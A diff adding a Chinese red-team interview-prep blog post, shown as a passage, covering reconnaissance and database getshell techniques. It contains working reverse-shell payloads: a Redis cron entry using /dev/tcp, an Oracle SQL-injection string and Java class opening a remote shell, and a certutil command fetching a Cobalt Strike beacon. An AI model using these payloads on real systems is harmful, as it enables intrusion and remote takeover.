@@ -1,0 +1,447 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>护网行动(二)-红队面试 | Egstar站长</title><meta name="author" content="Egstar"><meta name="copyright" content="Egstar"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本篇用来记录近几年来重点针对红队人员的面试问题，涵盖大厂、护网等面试真题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="护网行动(二)-红队面试">
+<meta property="og:url" content="http://egstar.top/post/ac7c753b.html">
+<meta property="og:site_name" content="Egstar站长">
+<meta property="og:description" content="本篇用来记录近几年来重点针对红队人员的面试问题，涵盖大厂、护网等面试真题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://egstar.top/images/zhongli.jpg">
+<meta property="article:published_time" content="2024-05-17T07:03:59.000Z">
+<meta property="article:modified_time" content="2024-05-20T09:15:18.914Z">
+<meta property="article:author" content="Egstar">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="面试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://egstar.top/images/zhongli.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://egstar.top/post/ac7c753b.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Egstar","link":"链接: ","source":"来源: Egstar站长","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '护网行动(二)-红队面试',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-20 17:15:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/page.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.2.0"></head><body><link rel="stylesheet" href="/css/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/pkds.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/catlog/"><i class="fa-fw fa-solid fa-pen-to-square"></i><span> 更新日志</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文娱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/classics/"><i class="fa-fw fa-solid fa-book-open-reader"></i><span> 古典</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comments"></i><span> 关于</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-solid fa-message"></i><span> 留言板</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/zhongli.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Egstar站长"><span class="site-name">Egstar站长</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/catlog/"><i class="fa-fw fa-solid fa-pen-to-square"></i><span> 更新日志</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文娱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/classics/"><i class="fa-fw fa-solid fa-book-open-reader"></i><span> 古典</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comments"></i><span> 关于</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-solid fa-message"></i><span> 留言板</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">护网行动(二)-红队面试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-17T07:03:59.000Z" title="发表于 2024-05-17 15:03:59">2024-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-20T09:15:18.914Z" title="更新于 2024-05-20 17:15:18">2024-05-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="护网行动(二)-红队面试"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><body>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个地方用来写一些常见的全面的，在安全岗位中，应聘红队的一些面经或问题。通过本篇文章检验自己的能力水平，提高面试技巧。</p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="1、给你个目标如何进行信息收集"><a href="#1、给你个目标如何进行信息收集" class="headerlink" title="1、给你个目标如何进行信息收集"></a><strong>1、给你个目标如何进行信息收集</strong></h2><p>如果是单位名称，先是查询备案信息获取主域名。然后对主域名进行子域名探测。在Github或搜索引擎上搜索相关目标是否有泄露账号、源码、资产信息。收集目标域名邮箱。收集到的子域名在空间测绘上批量探测，历史开放资产情况。收集所有信息、url地址、旁站、测试环境等、对目标进行指纹识别。之后根据指纹找漏洞利用。（附加：在fofa、鹰图、360等平台根据目标名称等先探测出资产）</p>
+<h2 id="2、子域名有哪些收集方式"><a href="#2、子域名有哪些收集方式" class="headerlink" title="2、子域名有哪些收集方式"></a><strong>2、子域名有哪些收集方式</strong></h2><blockquote>
+<p>子域名挖掘机</p>
+<p>在线子域名枚举网站</p>
+<p>fofa、360quake、鹰图、zomeye、零零信安等空间测绘</p>
+<p>oneforall</p>
+<p>自定义字典对子域名进行爆破</p>
+</blockquote>
+<h2 id="3、知道哪些数据库"><a href="#3、知道哪些数据库" class="headerlink" title="3、知道哪些数据库"></a><strong>3、知道哪些数据库</strong></h2><p>MySQL、Oracle、MSSQL、Redis、Mongodb、Postgre、mariadb等</p>
+<h2 id="4、讲讲各个数据库怎么getshell"><a href="#4、讲讲各个数据库怎么getshell" class="headerlink" title="4、讲讲各个数据库怎么getshell"></a><strong>4、讲讲各个数据库怎么getshell</strong></h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>MySQL的话可以通过sql注入向网站路径写入webshell，用select ”shell“ into outfile “path”。不过前提是</p>
+<p>mysql中secure_file_priv配置为空&#x3D;”” ，MYSQL服务导入和导出不做限制。同时还需要知道网站的绝对路径（不过绝对路径可以通过sql报错获取、或者把shell写入日志文件中）、当前数据库用户对目录的写入权限。</p>
+<blockquote>
+<ul>
+<li>如果secure_file_priv&#x3D;NULL，MYSQL服务会禁止导入和导出操作。</li>
+<li>如果secure_file_priv&#x3D;&#x2F;tmp&#x2F;，MYSQL服务只能在&#x2F;tmp&#x2F;目录下导入和导出</li>
+<li>如果secure_file_priv&#x3D;”” ，MYSQL服务导入和导出不做限制</li>
+</ul>
+</blockquote>
+<p>MySQL还可以通过udf(自定义函数)、mof加载提权获取shell，不过前提是获取到数据库的最高用户权限</p>
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>Redis的话可以通过主从复制、写计划任务、ssh公钥、网站路径写入webshell等方式getshell</p>
+<p>写计划任务、ssh公钥、webshell都是一样的步骤</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span>   设置一个键值对
+
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span>           <span class="token comment">#设置工作路径</span>
+
+config <span class="token builtin class-name">set</span> dbfilename    <span class="token comment">#设置目标文件</span>
+
+save                     <span class="token comment">#保存配置、等待一分钟Redis重新获取配置即可（建议提前config get原来配置避免业务异常）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><p>redis是基于内存、可选持久性的数据存储数据库，当redis存储了大量数据时会影响服务器的读写性能，这就引入了主从复制功能。主节点redis与从节点redis数据相同、但是分工不同。主节点负责写、从节点负责读这样就减轻了主节点的负担。</p>
+<p>利用条件：能够未授权访问，或知道口令获取redis权限</p>
+<p>利用方式：使用slaveof host port将当前redis指定为指定redis服务器的从节点，slave of NO ONE 取消从节点设置</p>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>Oracle的话获取了数据库权限，可以写java可执行代码获取shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">收集是否DBA: --is-dba
+
+进入 --sql-shell 
+
+查询SID：select instance_name from <span class="token function">v</span><span class="token variable">$instance</span>
+
+查询当前IP：select sys_context<span class="token punctuation">(</span><span class="token string">'userenv'</span>,<span class="token string">'ip_address'</span><span class="token punctuation">)</span> from dual
+
+爆破所有数据库账号、密码: <span class="token parameter variable">--password</span>   <span class="token comment">#获取上述信息后使用工具OracleShell</span>
+
+写java反弹shell代码
+<span class="token string">' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('</span>FOO<span class="token string">','</span>BAR<span class="token string">','</span>DBMS_OUTPUT<span class="token string">".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "</span>shell<span class="token string">" as import java.io.*;import java.net.*;public class shell&#123;public static void run() throws Exception &#123;Socket s = new Socket("</span><span class="token punctuation">&#123;</span>your_ip<span class="token punctuation">&#125;</span><span class="token string">", &#123;your_port&#125;);Process p = Runtime.getRuntime().exec("</span>C:/Windows/System32/cmd.exe<span class="token operator">|</span>/bin/bash"<span class="token punctuation">)</span><span class="token punctuation">;</span>new T<span class="token punctuation">(</span>p.getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>, s.getOutputStream<span class="token punctuation">(</span><span class="token punctuation">))</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>new T<span class="token punctuation">(</span>p.getErrorStream<span class="token punctuation">(</span><span class="token punctuation">)</span>, s.getOutputStream<span class="token punctuation">(</span><span class="token punctuation">))</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>new T<span class="token punctuation">(</span>s.getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>, p.getOutputStream<span class="token punctuation">(</span><span class="token punctuation">))</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>static class T extends Thread <span class="token punctuation">&#123;</span>private InputStream i<span class="token punctuation">;</span>private OutputStream u<span class="token punctuation">;</span>public T<span class="token punctuation">(</span>InputStream in, OutputStream out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>this.u <span class="token operator">=</span> out<span class="token punctuation">;</span>this.i <span class="token operator">=</span> <span class="token keyword">in</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>public void <span class="token function-name function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>BufferedReader n <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>new InputStreamReader<span class="token punctuation">(</span>i<span class="token punctuation">))</span><span class="token punctuation">;</span>BufferedWriter w <span class="token operator">=</span> new BufferedWriter<span class="token punctuation">(</span>new OutputStreamWriter<span class="token punctuation">(</span>u<span class="token punctuation">))</span><span class="token punctuation">;</span>char f<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> new char<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>int l<span class="token punctuation">;</span>try <span class="token punctuation">&#123;</span>while <span class="token variable"><span class="token punctuation">((</span>l <span class="token operator">=</span> n.read<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> f.length<span class="token punctuation">))</span></span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>w.write<span class="token punctuation">(</span>f, <span class="token number">0</span>, l<span class="token punctuation">)</span><span class="token punctuation">;</span>w.flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> catch <span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>try <span class="token punctuation">&#123;</span>if <span class="token punctuation">(</span>n <span class="token operator">!=</span> null<span class="token punctuation">)</span>n.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>w <span class="token operator">!=</span> null<span class="token punctuation">)</span>w.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token string">''</span>'<span class="token string">';END;'</span>'<span class="token punctuation">;</span>END<span class="token punctuation">;</span>--<span class="token string">','</span>SYS<span class="token string">',0,'</span><span class="token number">1</span>',0<span class="token punctuation">)</span> from dual<span class="token punctuation">)</span> is not null--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> shell <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Socket</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"&#123;your_ip&#125;"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>your_port<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"C:/Windows/System32/cmd.exe|/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">T</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token class-name">InputStream</span> i<span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token class-name">OutputStream</span> u<span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in <span class="token punctuation">,</span> <span class="token class-name">OutputStream</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>u <span class="token operator">=</span> out<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>i <span class="token operator">=</span> in <span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">BufferedReader</span> n <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">BufferedWriter</span> w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">char</span> f<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> l<span class="token punctuation">;</span>
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    w<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    w<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> n<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>w <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>MSSQL的话内容比较大，具体的细节可以看看 <u>先知社区</u> 这篇文章  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8603?time__1311=n4%2BxuDgDBDyCG%3DG87D%2FD0ioUYRexRlOY8oD&alichlgref=https%3A%2F%2Fcn.bing.com%2F">MSSQL Getshell方法</a></p>
+<p>通过SQL注入获取–os-shell，然后在可写入目录下命令执行下载cs马</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://192.168.163.128:8080/artifact.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>堆叠注入开启 xp_cmdshell 执行系统命令</p>
